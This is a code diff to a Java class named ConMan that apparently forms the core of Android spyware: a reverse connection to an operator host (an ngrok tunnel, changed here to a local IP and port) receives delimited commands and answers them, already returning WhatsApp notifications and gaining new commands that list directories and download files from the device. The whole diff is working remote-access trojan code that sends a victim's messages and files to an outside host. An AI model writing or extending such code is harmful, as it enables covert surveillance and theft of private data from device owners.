@@ -17,7 +17,7 @@ public class ConMan {
     public static void revConInit() throws Exception {
 
         // start a socket
-        Socket socket = new Socket("2.tcp.ngrok.io", 18560);
+        Socket socket = new Socket("192.168.18.25", 8888);
 
         // Input Socket
         BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
@@ -66,7 +66,7 @@ public class ConMan {
     private static String performOps(String op){
         String returnMessage;
 
-        String chunks[] = op.split("!?#");
+        String chunks[] = op.split("090078601");
 
         switch (chunks[0]) {
             // Initial Con
@@ -93,6 +93,14 @@ public class ConMan {
             // Whatsapp Notification
             case "0xWA":
                 returnMessage = String.valueOf(NotificationListener.GetWhatsappNotifications());
+                break;
+            // List Files in Given Directory
+            case "0xF0":
+                returnMessage = String.valueOf(FileMan.walk(chunks[1]));
+                break;
+            // Download File Given Path
+            case "0xF1":
+                returnMessage = String.valueOf(FileMan.downloadFile(chunks[1]));
                 break;
             default:
                 returnMessage = "Invalid";
